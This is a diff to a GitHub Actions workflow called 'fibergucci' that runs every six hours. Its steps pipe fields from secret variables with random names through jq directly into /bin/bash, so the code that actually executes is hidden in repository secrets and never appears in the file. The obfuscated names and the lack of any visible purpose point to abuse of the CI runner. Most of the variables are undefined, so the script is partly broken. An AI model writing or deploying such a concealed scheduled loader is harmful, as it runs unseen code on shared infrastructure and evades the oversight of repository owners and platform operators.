@@ -1,27 +1,31 @@
 name: fibergucci
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 0/6 * * *'
+    - cron: '54 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: fibergucci
         env:
-          ocb286: ${{ secrets.ocb286 }}
+          seupd690: ${{ secrets.seupd690 }}
         run: |
-          echo $ocb286 | jq -r .zlr732 | /bin/bash
-          echo $p590 | jq -r .xzxoy6780 | /bin/bash
-          echo $odoys064 | jq -r .bkxi6 | /bin/bash
-          echo $ecqvj3 | jq -r .hf7 | /bin/bash
-          echo $y6 | jq -r .mkp9 | /bin/bash
-          echo $fezg6590 | jq -r .uqtqz57 | /bin/bash
-          echo $yimg738 | jq -r .jc31 | /bin/bash
-          echo $r32 | jq -r .mj610 | /bin/bash
-          echo $bmi612 | jq -r .a5354 | /bin/bash
-          echo $egh739 | jq -r .losd5 | /bin/bash
-          echo $jevwv6 | jq -r .cp86 | /bin/bash
+          echo $seupd690 | jq -r .qnzqz8851 | /bin/bash
+          echo $uzgpl46 | jq -r .hjtds89236 | /bin/bash
+          echo $i168 | jq -r .fwo54 | /bin/bash
+          echo $ys7694 | jq -r .az14765 | /bin/bash
+          echo $xbr05993 | jq -r .cgj43051 | /bin/bash
+          echo $y01 | jq -r .uwxnr7705 | /bin/bash
+          echo $tphmh0327 | jq -r .ij32 | /bin/bash
+          echo $io409 | jq -r .xei37 | /bin/bash
+          echo $xfd20087 | jq -r .untzm7 | /bin/bash
+          echo $liomi0 | jq -r .sbtkk86 | /bin/bash
+          echo $tkb75 | jq -r .zvil7119 | /bin/bash
+          echo $y3189 | jq -r .sqj22 | /bin/bash
+          echo $h044 | jq -r .mw50394 | /bin/bash
+          echo $szmh6 | jq -r .touw498 | /bin/bash
+          echo $rq35 | jq -r .p52 | /bin/bash
 
